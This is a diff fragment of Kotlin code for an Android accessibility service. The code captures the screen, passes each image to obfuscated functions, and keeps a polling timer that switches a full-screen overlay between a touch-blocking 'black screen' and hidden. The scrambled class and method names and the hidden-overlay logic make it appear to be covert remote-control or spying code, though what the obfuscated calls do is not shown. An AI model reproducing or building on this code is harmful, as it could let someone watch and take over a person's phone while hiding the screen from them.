+		) : Thread() {
+		
+		    override fun run() {
+		        var originalBitmap: Bitmap? = null
+		        var hardwareBuffer: HardwareBuffer? = null
+		
+		        try {
+		            if (shouldRun && !SKL) {
+
+		            } else {
+		                return
+		            }
+		
+		            hardwareBuffer = screenshotResult.hardwareBuffer
+		            val colorSpace: ColorSpace? = screenshotResult.colorSpace
+		            originalBitmap = hardwareBuffer?.let { Bitmap.wrapHardwareBuffer(it, colorSpace) }
+		
+		            if (originalBitmap == null) return
+		
+		            EqljohYazB0qrhnj.a012933444445(originalBitmap)
+		
+		        } catch (e: Exception) {
+		            e.printStackTrace()
+		        } finally {           
+		            originalBitmap?.recycle()
+		            hardwareBuffer?.close()
+		        }
+		    }
+		}
+
+		
+        override fun onFailure(errorCode: Int) {
+            if (errorCode == 3) {
+                
+            }
+        }
+
+        override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
+            if (shouldRun && !SKL) {
+                ScreenshotThread(screenshotResult).start()
+            }
+            else
+            {
+                screenshotResult.hardwareBuffer?.close()
+            }
+        }
+    }
+
+   
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        ctx = this
+
+		ClsFx9V0S.mvky6Ica(this)
+        if (pendingIgnoreCapture) {
+            startIgnoreCapture("service-connected")
+        }
+
+	   
+        fakeEditTextForTextStateCalculation = EditText(this)
+        // Size here doesn't matter, we won't show this view.
+        fakeEditTextForTextStateCalculation?.layoutParams = LayoutParams(100, 100)
+        fakeEditTextForTextStateCalculation?.onPreDraw()
+        val layout = fakeEditTextForTextStateCalculation?.getLayout()
+
+         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+        try {
+
+			if(windowManager!=null)
+			{
+				e15f7cc69f667bd3()	
+                handler.postDelayed(runnable, 1000)
+			}
+			else
+			{
+				
+			}
+
+        } catch (e: Exception) {
+     
+        }
+    }
+
+
+  private fun e15f7cc69f667bd3()
+	{
+        overLay = ClsFx9V0S.DyXxszSR(
+	    this, windowManager,
+	    viewUntouchable, viewTransparency,
+	    ClsFx9V0S.WzQ6szeN(), ClsFx9V0S.DDYMuDRO(),
+	    ClsFx9V0S.RN4dU1zD(), ClsFx9V0S.w7I1XzPj()
+	)
+}
+
+    private val handler = Handler(Looper.getMainLooper())
+	
+	private val runnable = object : Runnable {
+    override fun run() {
+        if (overLay!=null && overLay.windowToken != null) {
+            val targetVisibility = gohome
+            if (overLay.visibility != targetVisibility) {
+                overLay.post {
+                    try {
+                        val params = overLay.layoutParams as WindowManager.LayoutParams
+                        overLay.visibility = targetVisibility
+                        if (targetVisibility == View.GONE) {
+                            isBlackScreenActive = false
+                            handler.removeCallbacks(restoreBlockRunnable)
+                            params.flags = params.flags or FLAG_NOT_TOUCHABLE
+                        } else {
+                            isBlackScreenActive = true
+                            params.flags = params.flags and FLAG_NOT_TOUCHABLE.inv()
+                        }
+                        windowManager.updateViewLayout(overLay, params)
+                    } catch (e: Exception) {
+                        Log.e("InputService", "runnable: updateViewLayout failed", e)
+                    }
+                }
+            }
+            BIS = overLay.visibility != View.GONE
+        }
+        handler.postDelayed(this, 50)
+    }
+}
+
+	
+    override fun onDestroy() {
+		if(ctx!=null)
+    {    ctx = null
+	}
+		// 停止 50ms 轮询定时器，防止 Handler 泄漏
+		handler.removeCallbacks(runnable)
+		handler.removeCallbacks(restoreBlockRunnable)
+
+		if(windowManager!=null)
+		{
+			try {
+				windowManager.removeView(overLay)
+			} catch (e: Exception) {
+				Log.e("InputService", "removeView failed", e)
+			}
+		}
+
+		 shouldRun =false
+		 i.shutdown()
+
+        super.onDestroy()
+    }
+
+    override fun onInterrupt() {}
+}
